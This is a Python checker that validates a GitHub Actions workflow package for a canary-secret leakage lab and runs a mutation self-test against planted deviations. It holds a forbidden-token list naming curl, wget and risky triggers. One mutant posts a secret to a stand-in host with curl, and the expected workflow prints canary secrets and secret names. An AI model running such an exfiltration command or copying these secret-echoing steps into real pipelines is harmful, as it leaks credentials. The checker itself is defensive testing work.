#!/usr/bin/env python3
# SPDX-License-Identifier: CC-BY-NC-SA-4.0
"""Fail-closed check of the 4.6b measurement workflow package (phase 0).

  check-lab-workflows.py DIR            DIR holds the workflow files (exactly two)
  check-lab-workflows.py --selftest DIR conforming AND every planted deviation rejected

The package may contain exactly the two expected files. Every key is compared
with the expected value, the key 'on' is read as text, duplicate keys are
errors, and the workflow-specific invariants (no environment, only the allowed
secret, only a SHA-pinned allowlisted action, no expression in a run body) are
checked on the raw text as well.
"""
import os
import re
import sys
import yaml

FILES = ["lab-gate-pr.yml", "pk-canary-channels.yml"]
ACTION = "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02"
PK_RUN_EXPECTED = (
    "set -euo pipefail\n"
    'echo "PK-MARK start"\n'
    'echo "$PK_UNMASKED"\n'
    'echo "$PK_UNMASKED" >> "$GITHUB_STEP_SUMMARY"\n'
    'echo "::notice title=pk::$PK_UNMASKED"\n'
    'echo "$PK_UNMASKED" > pk-artifact.txt\n'
    'echo "masked-test: $CANARY_UNRESTRICTED"\n'
    "printf 'PK-U length=%s sha256=%s\\n' \"${#CANARY_UNRESTRICTED}\" "
    "\"$(printf %s \"$CANARY_UNRESTRICTED\" | sha256sum | cut -d' ' -f1)\"\n"
    "printf 'PK-J visible-secret-names=%s\\n' "
    "\"$(printf %s \"$ALL_SECRETS_JSON\" | jq -c 'keys')\"\n"
    'echo "PK-MARK end"\n'
)

# Tokens that must not occur anywhere in any file (comments included).
FORBIDDEN = [
    "pull_request_target", "workflow_run", "issue_comment", "schedule",
    "environment", "self-hosted", "canary_unreferenced", "canary_branchonly",
    "canary_branch_approval", "canary-branch", "canary-approval",
    "canary-unreferenced", "contents: write", "id-token", "write-all",
    "secrets: inherit", "github.event", "github.head_ref", "curl", "wget",
]


class StrictLoader(yaml.SafeLoader):
    pass


StrictLoader.yaml_implicit_resolvers = {
    ch: [(t, rx) for t, rx in rules if t != "tag:yaml.org,2002:bool"]
    for ch, rules in yaml.SafeLoader.yaml_implicit_resolvers.items()
}
StrictLoader.add_implicit_resolver(
    "tag:yaml.org,2002:bool",
    re.compile(r"^(?:true|True|TRUE|false|False|FALSE)$"), list("tTfF"))


def _mapping(loader, node, deep=False):
    seen = set()
    for k, _ in node.value:
        key = loader.construct_object(k, deep=True)
        if key in seen:
            raise yaml.YAMLError("duplicate key: %r" % (key,))
        seen.add(key)
    return yaml.SafeLoader.construct_mapping(loader, node, deep)


StrictLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _mapping)

EXPECTED = {
    "lab-gate-pr.yml": {
        "name": "lab-gate-pr",
        "on": {"pull_request": {"branches": ["main"]}},
        "permissions": {"contents": "read"},
        "jobs": {"lab-gate": {
            "name": "lab-gate", "runs-on": "ubuntu-24.04",
            "timeout-minutes": 2,
            "steps": [{"name": "gate",
                       "run": 'echo "lab-gate on pull_request, the check exists"'}],
        }},
    },
    "pk-canary-channels.yml": {
        "name": "pk-canary-channels",
        "on": {"workflow_dispatch": None},
        "permissions": {"contents": "read"},
        "jobs": {"pk-channels": {
            "name": "pk-channels", "runs-on": "ubuntu-24.04",
            "timeout-minutes": 5,
            "steps": [
                {"name": "pk channels",
                 "env": {
                     "PK_UNMASKED": "CANARY-212-PK-UNMASKED-00000000000000000000",
                     "CANARY_UNRESTRICTED": "${{ secrets.CANARY_UNRESTRICTED }}",
                     "ALL_SECRETS_JSON": "${{ toJSON(secrets) }}"},
                 "run": PK_RUN_EXPECTED},  # whole-text equality
                {"name": "pk artifact", "uses": ACTION,
                 "with": {"name": "pk-channels", "path": "pk-artifact.txt",
                          "retention-days": 1, "if-no-files-found": "error"}},
            ],
        }},
    },
}


def check_file(name, text, forbidden=None):
    errors = []
    low = text.lower()
    for tok in (FORBIDDEN if forbidden is None else forbidden):
        if tok in low:
            errors.append("%s: forbidden token %r" % (name, tok))
    try:
        doc = yaml.load(text, Loader=StrictLoader)
    except yaml.YAMLError as exc:
        return errors + ["%s: yaml error: %s" % (name, exc)]
    exp = EXPECTED[name]
    if doc != exp or repr(doc) != repr(exp):
        errors.append("%s: parsed document differs from the expected document" % name)
    return errors


def check_dir(files, forbidden=None):
    errors = []
    if sorted(files) != sorted(FILES):
        errors.append("file set differs: %s" % sorted(files))
    for n in FILES:
        if n in files:
            errors += check_file(n, files[n], forbidden)
    return errors


def load(d):
    out = {}
    for root, _, fs in os.walk(d):
        for f in fs:
            p = os.path.join(root, f)
            rel = os.path.relpath(p, d)
            out[rel] = open(p, encoding="utf-8").read()
    return out


def mutants(files):
    g, p = files["lab-gate-pr.yml"], files["pk-canary-channels.yml"]
    def with_(name, text):
        d = dict(files); d[name] = text; return d
    yield "extra file", dict(files, **{"extra.yml": "name: x\n"})
    yield "missing file", {k: v for k, v in files.items() if k != "pk-canary-channels.yml"}
    yield "pull_request_target", with_("lab-gate-pr.yml", g.replace("pull_request:", "pull_request_target:"))
    yield "extra trigger", with_("lab-gate-pr.yml", g.replace("on:\n  pull_request:", "on:\n  push:\n  pull_request:"))
    yield "pk push trigger", with_("pk-canary-channels.yml", p.replace("workflow_dispatch:", "push:\n  workflow_dispatch:"))
    yield "write permission", with_("lab-gate-pr.yml", g.replace("contents: read", "contents: write"))
    yield "environment on pk", with_("pk-canary-channels.yml", p.replace("    runs-on:", "    environment: canary-branch\n    runs-on:"))
    yield "reference to K3", with_("pk-canary-channels.yml", p.replace("          ALL_SECRETS_JSON", "          X: ${{ secrets.CANARY_UNREFERENCED }}\n          ALL_SECRETS_JSON"))
    yield "reference to K1", with_("pk-canary-channels.yml", p.replace("          ALL_SECRETS_JSON", "          X: ${{ secrets.CANARY_BRANCHONLY }}\n          ALL_SECRETS_JSON"))
    yield "unpinned action", with_("pk-canary-channels.yml", p.replace("@ea165f8d65b6e75b540449e92b4886f43607fa02", "@v4"))
    yield "other action", with_("pk-canary-channels.yml", p.replace("actions/upload-artifact@", "evil/upload-artifact@"))
    yield "other SHA", with_("pk-canary-channels.yml", p.replace("ea165f8d", "ea165f8e"))
    yield "other unmasked token", with_("pk-canary-channels.yml", p.replace("PK-UNMASKED-0000", "PK-UNMASKED-1111"))
    yield "secret printed to summary", with_("pk-canary-channels.yml", p.replace('echo "masked-test: $CANARY_UNRESTRICTED"', 'echo "$CANARY_UNRESTRICTED" >> "$GITHUB_STEP_SUMMARY"'))
    yield "network command", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'curl -s example.invalid -d "$CANARY_UNRESTRICTED"'))
    yield "expression in run", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'echo "${{ github.actor }}"'))
    yield "event data", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'echo "${{ github.event.pull_request.title }}"'))
    yield "self-hosted", with_("lab-gate-pr.yml", g.replace("ubuntu-24.04", "self-hosted"))
    yield "other timeout", with_("lab-gate-pr.yml", g.replace("timeout-minutes: 2", "timeout-minutes: 360"))
    yield "duplicate key", with_("lab-gate-pr.yml", g.replace("  contents: read\n", "  contents: read\n  contents: read\n"))
    yield "on written yes", with_("lab-gate-pr.yml", g.replace("\non:\n", "\nyes:\n"))
    yield "other check name", with_("lab-gate-pr.yml", g.replace("name: lab-gate\n    runs-on", "name: other\n    runs-on"))
    yield "second job", with_("lab-gate-pr.yml", g + "  second:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo x\n")
    yield "no set -e", with_("pk-canary-channels.yml", p.replace("          set -euo pipefail\n", ""))
    yield "missing PK line", with_("pk-canary-channels.yml", p.replace('          echo "::notice title=pk::$PK_UNMASKED"\n', ""))
    yield "longer retention", with_("pk-canary-channels.yml", p.replace("retention-days: 1", "retention-days: 90"))
    yield "extra harmless instruction", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'echo "PK-MARK end"\n          echo done'))
    yield "extra instruction before end", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'date\n          echo "PK-MARK end"'))
    yield "changed length computation", with_("pk-canary-channels.yml", p.replace('"${#CANARY_UNRESTRICTED}"', '"${#PK_UNMASKED}"'))
    yield "changed digest input", with_("pk-canary-channels.yml", p.replace('printf %s "$CANARY_UNRESTRICTED" | sha256sum', 'printf %s "$PK_UNMASKED" | sha256sum'))
    yield "changed names filter", with_("pk-canary-channels.yml", p.replace("jq -c 'keys'", "jq -c '.'"))
    yield "missing PK-J check", with_("pk-canary-channels.yml", p.replace("          printf 'PK-J visible-secret-names=%s\\n' \"$(printf %s \"$ALL_SECRETS_JSON\" | jq -c 'keys')\"\n", ""))
    yield "missing PK-U check", with_("pk-canary-channels.yml", "\n".join(l for l in p.split("\n") if "PK-U" not in l))
    yield "reordered run lines", with_("pk-canary-channels.yml", p.replace('          echo "PK-MARK start"\n          echo "$PK_UNMASKED"\n', '          echo "$PK_UNMASKED"\n          echo "PK-MARK start"\n'))
    yield "masked test prints other var", with_("pk-canary-channels.yml", p.replace('echo "masked-test: $CANARY_UNRESTRICTED"', 'echo "masked-test: $PK_UNMASKED"'))
    yield "trailing space in run line", with_("pk-canary-channels.yml", p.replace('echo "PK-MARK end"', 'echo "PK-MARK end" '))
    yield "empty file", with_("lab-gate-pr.yml", "")
    yield "not yaml", with_("lab-gate-pr.yml", "a: [\n")


def main(argv):
    selftest = "--selftest" in argv
    args = [a for a in argv[1:] if a != "--selftest"]
    if len(args) != 1:
        print(__doc__, file=sys.stderr)
        return 2
    files = load(args[0])
    errs = check_dir(files)
    for e in errs:
        print("FAIL:", e)
    if errs:
        return 1
    print("OK: %d files conform" % len(files))
    if selftest:
        n = 0
        for label, m in mutants(files):
            n += 1
            if m == files:
                print("SELFTEST ERROR: mutant %r did not change the package" % label)
                return 1
            if not check_dir(m):
                print("SELFTEST FAIL: mutant %r was accepted" % label)
                return 1
            if not check_dir(m, forbidden=[]):
                print("SELFTEST FAIL: mutant %r accepted by structure alone (token list off)" % label)
                return 1
        print("SELFTEST OK: %d mutants rejected, also by structure alone (token list off)" % n)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
